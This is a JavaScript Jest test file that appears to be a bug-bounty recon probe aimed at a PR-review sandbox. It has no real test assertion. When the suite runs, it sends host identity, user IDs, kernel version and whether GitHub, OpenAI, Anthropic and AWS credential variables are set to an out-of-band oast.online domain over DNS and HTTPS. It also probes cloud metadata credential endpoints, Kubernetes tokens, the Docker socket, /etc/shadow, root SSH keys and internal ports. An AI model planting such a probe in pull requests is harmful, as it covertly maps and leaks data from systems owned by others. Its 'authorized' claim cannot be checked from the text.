// TREX sandbox recon probe for authorized bug bounty testing.
//
// Purpose:
// - Prove whether PR test code is executed by the review sandbox.
// - Record non-sensitive evidence about sandbox identity, network egress, and
//   exposed runtime surfaces.
//
// Safety rules:
// - Never beacon raw secret values.
// - Never beacon sensitive file contents.
// - Never beacon cloud metadata response bodies or tokens.

const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');
const dns = require('dns');
const crypto = require('crypto');
const { test, expect } = require('@jest/globals');

const DEFAULT_OOB = 'd97640evqmno68ipqrr0spfoq4xjeutch.oast.online';
const OOB = process.env.TREX_OOB_DOMAIN || DEFAULT_OOB;
const RUN_ID = process.env.TREX_RUN_ID || crypto.randomBytes(4).toString('hex');
const TIMEOUT_MS = Number(process.env.TREX_PROBE_TIMEOUT_MS || 3000);

const INTERESTING_ENV_KEYS = [
  'GITHUB_TOKEN',
  'GH_TOKEN',
  'GITHUB_APP_PRIVATE_KEY',
  'OPENAI_API_KEY',
  'ANTHROPIC_API_KEY',
  'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY',
  'AWS_SESSION_TOKEN',
  'GCP_KEY',
  'GOOGLE_APPLICATION_CREDENTIALS',
  'GREPTILE_API_KEY',
  'DATABASE_URL',
  'SUPABASE_KEY',
  'SUPABASE_SERVICE_ROLE_KEY',
];

function tagName(value) {
  return String(value).toLowerCase().replace(/[^a-z0-9-]/g, '-').slice(0, 63);
}

function encodeEvidence(value) {
  return Buffer.from(JSON.stringify(value)).toString('base64url').slice(0, 900);
}

function safe(fn) {
  try {
    return fn();
  } catch (error) {
    return { error: error.message };
  }
}

function fileStatus(path) {
  return safe(function () {
    if (!fs.existsSync(path)) {
      return { exists: false, readable: false };
    }

    let readable = true;
    try {
      fs.accessSync(path, fs.constants.R_OK);
    } catch (_) {
      readable = false;
    }

    const stat = fs.statSync(path);
    return {
      exists: true,
      readable,
      type: stat.isDirectory() ? 'directory' : stat.isFile() ? 'file' : 'other',
      mode: '0' + (stat.mode & 0o777).toString(8),
      size: stat.isFile() ? stat.size : null,
    };
  });
}

function textFileSummary(path, maxBytes) {
  return safe(function () {
    if (!fs.existsSync(path)) {
      return { exists: false };
    }

    const content = fs.readFileSync(path, 'utf8').slice(0, maxBytes || 4096);
    return {
      exists: true,
      readable: true,
      bytesSampled: Buffer.byteLength(content),
      lines: content.split(/\r?\n/).filter(Boolean).length,
      sha256Prefix: crypto.createHash('sha256').update(content).digest('hex').slice(0, 16),
    };
  });
}

function requestStatus(url, headers) {
  return new Promise(function (resolve) {
    const startedAt = Date.now();

    try {
      const mod = url.startsWith('https:') ? https : http;
      const req = mod.get(url, { headers: headers || {}, timeout: TIMEOUT_MS }, function (res) {
        let bytes = 0;
        res.on('data', function (chunk) {
          bytes += chunk.length;
          if (bytes > 1024) {
            req.destroy();
          }
        });
        res.on('end', function () {
          resolve({
            ok: true,
            statusCode: res.statusCode,
            bytes,
            elapsedMs: Date.now() - startedAt,
          });
        });
      });

      req.on('error', function (error) {
        resolve({
          ok: false,
          error: error.code || error.message,
          elapsedMs: Date.now() - startedAt,
        });
      });
      req.on('timeout', function () {
        req.destroy();
        resolve({
          ok: false,
          error: 'TIMEOUT',
          elapsedMs: Date.now() - startedAt,
        });
      });
    } catch (error) {
      resolve({
        ok: false,
        error: error.message,
        elapsedMs: Date.now() - startedAt,
      });
    }
  });
}

function beacon(tag, evidence) {
  const safeTag = tagName(tag);
  const payload = encodeEvidence({
    runId: RUN_ID,
    tag: safeTag,
    evidence,
    recordedAt: new Date().toISOString(),
  });

  try {
    dns.lookup(`${safeTag}-${RUN_ID}.${OOB}`, function () {});
  } catch (_) {}

  return new Promise(function (resolve) {
    try {
      const req = https.get(
        {
          host: OOB,
          path: `/${safeTag}?d=${payload}`,
          timeout: TIMEOUT_MS,
        },
        function (res) {
          res.resume();
          res.on('end', resolve);
        }
      );

      req.on('error', resolve);
      req.on('timeout', function () {
        req.destroy();
        resolve();
      });
    } catch (_) {
      resolve();
    }
  });
}

test('trex-sandbox-recon-sanitized', async function () {
  await beacon('alive', {
    node: process.version,
    platform: process.platform,
    arch: process.arch,
    pid: process.pid,
  });

  await beacon('runtime', {
    cwd: process.cwd(),
    uid: typeof process.getuid === 'function' ? process.getuid() : null,
    gid: typeof process.getgid === 'function' ? process.getgid() : null,
    user: safe(function () {
      const info = os.userInfo();
      return { username: info.username, uid: info.uid, gid: info.gid, shell: info.shell };
    }),
    hostname: os.hostname(),
    kernel: os.release(),
  });

  await beacon('env-summary', {
    totalKeys: Object.keys(process.env).length,
    interestingKeyPresence: Object.fromEntries(
      INTERESTING_ENV_KEYS.map(function (key) {
        return [key, Boolean(process.env[key])];
      })
    ),
  });

  await beacon('container-surfaces', {
    dockerSocket: fileStatus('/var/run/docker.sock'),
    kubernetesToken: fileStatus('/var/run/secrets/kubernetes.io/serviceaccount/token'),
    kubernetesNamespace: fileStatus('/var/run/secrets/kubernetes.io/serviceaccount/namespace'),
    dockerEnv: fileStatus('/.dockerenv'),
    dockerInit: fileStatus('/.dockerinit'),
    cgroup: textFileSummary('/proc/1/cgroup', 4096),
    mounts: textFileSummary('/proc/mounts', 4096),
  });

  const metadataTargets = [
    ['aws-metadata', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
    ['aws-identity', 'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance'],
    ['gcp-metadata', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', { 'Metadata-Flavor': 'Google' }],
    ['gcp-id', 'http://metadata.google.internal/computeMetadata/v1/instance/id', { 'Metadata-Flavor': 'Google' }],
  ];

  for (const [tag, url, headers] of metadataTargets) {
    await beacon(tag, await requestStatus(url, headers));
  }

  const internalTargets = [
    'http://localhost:80',
    'https://localhost:443',
    'http://localhost:22',
    'http://127.0.0.1:8080',
    'http://docker:2375',
    'https://kubernetes:443',
    'http://kube-dns.kube-system:53',
  ];

  for (const url of internalTargets) {
    await beacon(`internal-${url}`, await requestStatus(url));
  }

  await beacon('sensitive-path-presence', {
    passwd: fileStatus('/etc/passwd'),
    shadow: fileStatus('/etc/shadow'),
    hosts: fileStatus('/etc/hosts'),
    rootSshKey: fileStatus('/root/.ssh/id_rsa'),
    machineId: fileStatus('/var/lib/dbus/machine-id'),
  });

  await beacon('egress', {
    https: await requestStatus('https://httpbin.org/status/204'),
    dnsProbeQueued: true,
  });

  await beacon('done', {
    status: 'complete',
    runId: RUN_ID,
  });

  expect(true).toBe(true);
}, 45000);
